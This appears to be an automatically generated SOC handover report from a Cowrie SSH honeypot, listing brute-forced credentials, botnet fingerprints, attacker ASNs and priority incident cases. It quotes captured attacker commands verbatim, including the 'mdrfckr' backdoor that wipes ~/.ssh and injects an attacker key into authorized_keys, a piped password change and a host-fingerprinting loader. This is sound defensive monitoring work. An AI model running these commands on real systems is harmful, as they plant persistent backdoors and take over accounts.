# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-15 |
| **Generated At** | 2026-08-15T04:36:34Z |
| **Shift Time** | 04:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **479** |
| Confirmed Threats | **425** |
| False Positives Filtered | **54** (11.3%) |
| Unique Attacker IPs | **92** |
| Countries of Origin | **32** |
| High Severity Cases | **130** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **349** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **147** |
| Unique Credential Pairs | **101** |
| Unique Usernames | **37** |
| Unique Passwords | **75** |
| Successful Auth Pairs | **137** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `centos` | 12 |
| `admin` | 11 |
| `test` | 11 |
| `user` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `7` | 8 |
| `password` | 6 |
| `marketing` | 6 |
| `123123` | 5 |
| `12345678` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `nobody` | `marketing` | 6 |
| `centos` | `7` | 4 |
| `centos` | `Password` | 4 |
| `postgres` | `654321` | 4 |
| `blank` | `7` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `P@ssw0rd` | `92.118.39.77` | 2026-08-15T00:55:39 |
| `centos` | `7` | `50.217.40.11` | 2026-08-15T00:55:43 |
| `centos` | `7` | `60.174.39.82` | 2026-08-15T00:55:54 |
| `test` | `Admin@123` | `113.140.95.2` | 2026-08-15T00:56:46 |
| `test` | `Admin@123` | `62.201.253.23` | 2026-08-15T00:56:54 |
| `admin` | `admin` | `92.118.39.77` | 2026-08-15T00:57:36 |
| `root` | `admin123` | `217.165.22.192` | 2026-08-15T00:59:00 |
| `admin` | `passw0rd` | `92.118.39.77` | 2026-08-15T00:59:31 |
| `admin` | `password` | `92.118.39.77` | 2026-08-15T01:01:28 |
| `admin` | `password1` | `92.118.39.77` | 2026-08-15T01:03:26 |
| `user` | `0987654321` | `41.214.10.178` | 2026-08-15T01:03:32 |
| `user` | `0987654321` | `187.8.120.90` | 2026-08-15T01:03:39 |
| `user` | `0987654321` | `65.20.191.231` | 2026-08-15T01:03:55 |
| `admin` | `qwerty` | `92.118.39.77` | 2026-08-15T01:05:23 |
| `max` | `password` | `4.246.117.137` | 2026-08-15T01:06:06 |
| `345gs5662d34` | `345gs5662d34` | `4.246.117.137` | 2026-08-15T01:06:08 |
| `max` | `3245gs5662d34` | `4.246.117.137` | 2026-08-15T01:06:09 |
| `admin1` | `123123` | `92.118.39.77` | 2026-08-15T01:07:18 |
| `root` | `stfu_and_be_quite` | `175.100.107.238` | 2026-08-15T01:07:55 |
| `support` | `support` | `10.0.0.73` | 2026-08-15T01:07:56 |
| `test` | `qwe123` | `14.103.114.244` | 2026-08-15T01:09:02 |
| `admin1` | `12345` | `92.118.39.77` | 2026-08-15T01:09:19 |
| `admin1` | `123456` | `92.118.39.77` | 2026-08-15T01:11:17 |
| `centos` | `7` | `36.64.36.101` | 2026-08-15T01:11:35 |
| `centos` | `7` | `179.181.133.153` | 2026-08-15T01:11:44 |
| `admin1` | `password` | `92.118.39.77` | 2026-08-15T01:13:09 |
| `support` | `qwerty12` | `10.0.0.73` | 2026-08-15T01:13:14 |
| `administrator` | `123123` | `92.118.39.77` | 2026-08-15T01:15:05 |
| `root` | `112233332211` | `45.142.193.164` | 2026-08-15T01:16:22 |
| `user1` | `ZAQ!xsw2` | `91.92.42.34` | 2026-08-15T01:16:50 |
| `administrator` | `12345` | `92.118.39.77` | 2026-08-15T01:17:05 |
| `user3` | `1qazxsw2` | `91.92.42.34` | 2026-08-15T01:17:09 |
| `test` | `password1` | `91.92.42.34` | 2026-08-15T01:17:17 |
| `web` | `web1234567` | `91.92.42.34` | 2026-08-15T01:17:26 |
| `admin` | `09091992` | `91.92.42.34` | 2026-08-15T01:17:34 |
| `admin` | `admin01` | `91.92.42.34` | 2026-08-15T01:17:45 |
| `user0` | `1qaz3edc` | `91.92.42.34` | 2026-08-15T01:17:54 |
| `unknown` | `2222222222` | `91.92.42.34` | 2026-08-15T01:18:04 |
| `user` | `password1` | `91.92.42.34` | 2026-08-15T01:18:08 |
| `root` | `P@ssw0rd` | `217.165.22.192` | 2026-08-15T01:18:15 |
| `user1` | `password1` | `91.92.42.34` | 2026-08-15T01:18:21 |
| `admin` | `1147` | `91.92.42.34` | 2026-08-15T01:18:30 |
| `user0` | `P@$$w0rd` | `91.92.42.34` | 2026-08-15T01:18:37 |
| `Root` | `Root2010` | `91.92.42.34` | 2026-08-15T01:18:46 |
| `root` | `lobby` | `91.92.42.34` | 2026-08-15T01:18:56 |
| `administrator` | `123456` | `92.118.39.77` | 2026-08-15T01:19:03 |
| `user3` | `1qaz3edc` | `91.92.42.34` | 2026-08-15T01:19:05 |
| `rayven` | `rayven` | `91.92.42.34` | 2026-08-15T01:19:14 |
| `default` | `default123456` | `91.92.42.34` | 2026-08-15T01:19:26 |
| `opc` | `123456` | `91.92.42.34` | 2026-08-15T01:19:33 |
| `user0` | `1qaz@wsx` | `91.92.42.34` | 2026-08-15T01:19:41 |
| `unknown` | `unknown123456789` | `91.92.42.34` | 2026-08-15T01:19:50 |
| `user1` | `user11234567` | `91.92.42.34` | 2026-08-15T01:19:59 |
| `babygirl` | `babygirl` | `91.92.42.34` | 2026-08-15T01:20:08 |
| `user3` | `P@$$w0rd` | `91.92.42.34` | 2026-08-15T01:20:18 |
| `administrator` | `1234567` | `92.118.39.77` | 2026-08-15T01:21:01 |
| `administrator` | `12345678` | `92.118.39.77` | 2026-08-15T01:22:49 |
| `administrator` | `123456789` | `92.118.39.77` | 2026-08-15T01:24:38 |
| `administrator` | `password` | `92.118.39.77` | 2026-08-15T01:26:30 |
| `centos` | `Password` | `10.0.0.73` | 2026-08-15T01:27:40 |
| `apache` | `12345678` | `92.118.39.77` | 2026-08-15T01:28:25 |
| `root` | `password12345` | `14.103.114.244` | 2026-08-15T01:28:30 |
| `RPM` | `RPM` | `122.170.100.253` | 2026-08-15T01:29:23 |
| `RPM` | `RPM` | `195.222.57.183` | 2026-08-15T01:29:29 |
| `support` | `qwerty12` | `34.146.248.7` | 2026-08-15T01:30:20 |
| `apache` | `password` | `92.118.39.77` | 2026-08-15T01:30:24 |
| `000000` | `000000` | `187.115.144.103` | 2026-08-15T01:31:05 |
| `backup` | `123` | `92.118.39.77` | 2026-08-15T01:32:24 |
| `root` | `﻿------fuck------` | `169.58.161.169` | 2026-08-15T01:33:52 |
| `backup` | `12345678` | `92.118.39.77` | 2026-08-15T01:34:26 |
| `postgres` | `654321` | `178.178.194.135` | 2026-08-15T01:35:20 |
| `postgres` | `654321` | `124.239.169.52` | 2026-08-15T01:35:29 |
| `backup` | `backup` | `92.118.39.77` | 2026-08-15T01:36:27 |
| `test` | `qwerty12345` | `178.178.222.59` | 2026-08-15T01:36:54 |
| `test` | `qwerty12345` | `27.223.98.117` | 2026-08-15T01:37:02 |
| `test` | `qwerty12345` | `112.30.127.9` | 2026-08-15T01:37:09 |
| `root` | `qwe123!@#` | `217.165.22.192` | 2026-08-15T01:37:28 |
| `backup` | `backup123` | `92.118.39.77` | 2026-08-15T01:38:22 |
| `root` | `1234567` | `45.142.193.164` | 2026-08-15T01:39:04 |
| `backup` | `password` | `92.118.39.77` | 2026-08-15T01:40:17 |
| `centos` | `12345678` | `92.118.39.77` | 2026-08-15T01:42:08 |
| `root` | `abc123!!` | `14.103.114.244` | 2026-08-15T01:43:28 |
| `centos` | `654321` | `92.118.39.77` | 2026-08-15T01:44:00 |
| `centos` | `Password` | `65.20.187.47` | 2026-08-15T01:45:08 |
| `centos` | `Password` | `60.223.245.120` | 2026-08-15T01:45:18 |
| `centos` | `centos` | `92.118.39.77` | 2026-08-15T01:45:54 |
| `postgres` | `654321` | `10.0.0.73` | 2026-08-15T01:46:46 |
| `root` | `password123$` | `14.103.114.244` | 2026-08-15T01:47:16 |
| `centos` | `centos123` | `92.118.39.77` | 2026-08-15T01:47:51 |
| `debian` | `111111` | `92.118.39.77` | 2026-08-15T01:49:48 |
| `blank` | `7` | `10.0.0.73` | 2026-08-15T01:52:16 |
| `salim` | `salim` | `14.103.114.244` | 2026-08-15T01:54:34 |
| `345gs5662d34` | `345gs5662d34` | `14.103.114.244` | 2026-08-15T01:54:52 |
| `root` | `123456789a` | `217.165.22.192` | 2026-08-15T01:56:42 |
| `root` | `12345678` | `45.142.193.164` | 2026-08-15T02:01:38 |
| `ubnt` | `33333` | `196.216.81.126` | 2026-08-15T02:02:44 |
| `ubnt` | `33333` | `49.124.151.21` | 2026-08-15T02:02:56 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.14.77.4` | 2026-08-15T02:08:02 |
| `*1` | `$4` | `34.14.77.4` | 2026-08-15T02:08:11 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 5696` | `34.14.77.4` | 2026-08-15T02:08:13 |
| `support` | `support` | `176.53.159.196` | 2026-08-15T02:08:21 |
| `Admin` | `Passw0rd` | `24.142.170.231` | 2026-08-15T02:08:44 |
| `Admin` | `Passw0rd` | `122.176.45.238` | 2026-08-15T02:08:54 |
| `blank` | `7` | `178.178.222.50` | 2026-08-15T02:10:21 |
| `blank` | `7` | `211.23.109.116` | 2026-08-15T02:10:30 |
| `root` | `!Q2w3e4r` | `217.165.22.192` | 2026-08-15T02:15:57 |
| `xuhao` | `123456` | `14.103.114.244` | 2026-08-15T02:16:49 |
| `ubnt` | `33333` | `103.171.39.147` | 2026-08-15T02:18:49 |
| `ubnt` | `33333` | `222.186.68.153` | 2026-08-15T02:19:00 |
| `Admin` | `Passw0rd` | `10.0.0.73` | 2026-08-15T02:20:19 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.79.100.31` | 2026-08-15T02:22:30 |
| `*1` | `$4` | `34.79.100.31` | 2026-08-15T02:22:43 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 3901` | `34.79.100.31` | 2026-08-15T02:22:45 |
| `root` | `123456789` | `45.142.193.164` | 2026-08-15T02:24:07 |
| `root` | `abc123ABC` | `14.103.114.244` | 2026-08-15T02:32:19 |
| `nobody` | `marketing` | `10.0.0.73` | 2026-08-15T02:35:07 |
| `root` | `ABCdef123` | `217.165.22.192` | 2026-08-15T02:35:11 |
| `root` | `q1w2e3r$` | `14.103.114.244` | 2026-08-15T02:36:04 |
| `nobody` | `marketing` | `187.8.120.90` | 2026-08-15T02:36:38 |
| `nobody` | `marketing` | `179.184.85.167` | 2026-08-15T02:36:48 |
| `Admin` | `Passw0rd` | `41.45.177.186` | 2026-08-15T02:36:57 |
| `operator` | `operator1234567890` | `10.0.0.73` | 2026-08-15T02:39:05 |
| `user` | `123123` | `85.30.248.213` | 2026-08-15T02:42:06 |
| `user` | `123123` | `178.178.222.55` | 2026-08-15T02:42:14 |
| `prod` | `123456789` | `14.103.114.244` | 2026-08-15T02:43:34 |
| `test` | `qwerty1` | `222.139.245.137` | 2026-08-15T02:44:01 |
| `test` | `qwerty1` | `222.174.184.86` | 2026-08-15T02:44:12 |
| `test` | `qwerty1` | `113.11.34.221` | 2026-08-15T02:44:18 |
| `test` | `qwerty1` | `116.228.195.251` | 2026-08-15T02:44:27 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.79.38.96` | 2026-08-15T02:46:04 |
| `*1` | `$4` | `34.79.38.96` | 2026-08-15T02:46:18 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4898` | `34.79.38.96` | 2026-08-15T02:46:20 |
| `root` | `1234567890` | `45.142.193.164` | 2026-08-15T02:46:57 |
| `nobody` | `marketing` | `106.89.59.63` | 2026-08-15T02:52:40 |
| `nobody` | `marketing` | `196.189.126.10` | 2026-08-15T02:52:50 |
| `user` | `123123` | `10.0.0.73` | 2026-08-15T02:53:23 |
| `root` | `!QAZ2wsx` | `217.165.22.192` | 2026-08-15T02:54:25 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **479** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 70 |
| OpenSSH | 43 |
| libssh | 43 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 42 | 40 |
| `2ec37a7cc8da...` | Mirai/variant | 29 | 1 |
| `f555226df196...` | Mirai/variant | 28 | 2 |
| `0a07365cc01f...` | Generic scanner | 23 | 1 |
| `e45f2d6d7f79...` | Mirai/variant | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 42 | 40 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 29 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 28 | 2 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 23 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 15 | 6 | — |
| `e45f2d6d7f79...` | Go SSH scanner | 7 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 5 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 29 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "123456\nm0b07ERkZv1X\nm0b07ERkZv1X"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `14.103.114.244`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `4.246.117.137`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **92** |
| Unique ASNs | **61** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS25159` | PJSC MegaFon | 4 | HIGH |
| `AS48721` | Flyservers S.A. | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (130)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-76df8a9428cc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:55 |
| **Last Seen** | 2026-08-15 00:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:55:37` | `cowrie.session.connect` |
| `2026-08-15 00:55:37` | `cowrie.client.version` |
| `2026-08-15 00:55:37` | `cowrie.client.kex` |
| `2026-08-15 00:55:39` | `cowrie.login.success` |
| `2026-08-15 00:55:40` | `cowrie.session.params` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.command.success` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.command.input` |
| `2026-08-15 00:55:40` | `cowrie.log.closed` |
| `2026-08-15 00:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092735703f1e

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-08-15 00:55 |
| **Last Seen** | 2026-08-15 00:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:55:40` | `cowrie.session.connect` |
| `2026-08-15 00:55:41` | `cowrie.client.version` |
| `2026-08-15 00:55:41` | `cowrie.client.kex` |
| `2026-08-15 00:55:43` | `cowrie.login.success` |
| `2026-08-15 00:55:43` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-396195a03dfd

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-08-15 00:55 |
| **Last Seen** | 2026-08-15 00:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:55:49` | `cowrie.session.connect` |
| `2026-08-15 00:55:49` | `cowrie.client.version` |
| `2026-08-15 00:55:49` | `cowrie.client.kex` |
| `2026-08-15 00:55:54` | `cowrie.login.success` |
| `2026-08-15 00:55:55` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3affd7bb5a78

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]2` |
| **First Seen** | 2026-08-15 00:56 |
| **Last Seen** | 2026-08-15 00:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:56:43` | `cowrie.session.connect` |
| `2026-08-15 00:56:44` | `cowrie.client.version` |
| `2026-08-15 00:56:44` | `cowrie.client.kex` |
| `2026-08-15 00:56:46` | `cowrie.login.success` |
| `2026-08-15 00:56:46` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]2` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ffbb0ecc207

| Field | Detail |
|---|---|
| **Source IP** | `62.201.253[.]23` |
| **First Seen** | 2026-08-15 00:56 |
| **Last Seen** | 2026-08-15 00:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:56:51` | `cowrie.session.connect` |
| `2026-08-15 00:56:52` | `cowrie.client.version` |
| `2026-08-15 00:56:52` | `cowrie.client.kex` |
| `2026-08-15 00:56:54` | `cowrie.login.success` |
| `2026-08-15 00:56:54` | `cowrie.direct-tcpip.request` |
| `2026-08-15 00:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.253[.]23` to AbuseIPDB if not already reported
- [ ] Block `62.201.253[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acdaa39df5c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:57 |
| **Last Seen** | 2026-08-15 00:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:57:34` | `cowrie.session.connect` |
| `2026-08-15 00:57:35` | `cowrie.client.version` |
| `2026-08-15 00:57:35` | `cowrie.client.kex` |
| `2026-08-15 00:57:36` | `cowrie.login.success` |
| `2026-08-15 00:57:37` | `cowrie.session.params` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:37` | `cowrie.command.success` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:37` | `cowrie.command.input` |
| `2026-08-15 00:57:38` | `cowrie.log.closed` |
| `2026-08-15 00:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-225f68237a6b

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 00:58 |
| **Last Seen** | 2026-08-15 00:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:58:59` | `cowrie.session.connect` |
| `2026-08-15 00:58:59` | `cowrie.client.version` |
| `2026-08-15 00:59:00` | `cowrie.client.kex` |
| `2026-08-15 00:59:00` | `cowrie.login.success` |
| `2026-08-15 00:59:01` | `cowrie.session.params` |
| `2026-08-15 00:59:01` | `cowrie.command.input` |
| `2026-08-15 00:59:01` | `cowrie.log.closed` |
| `2026-08-15 00:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bff6a8b9a72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 00:59 |
| **Last Seen** | 2026-08-15 00:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
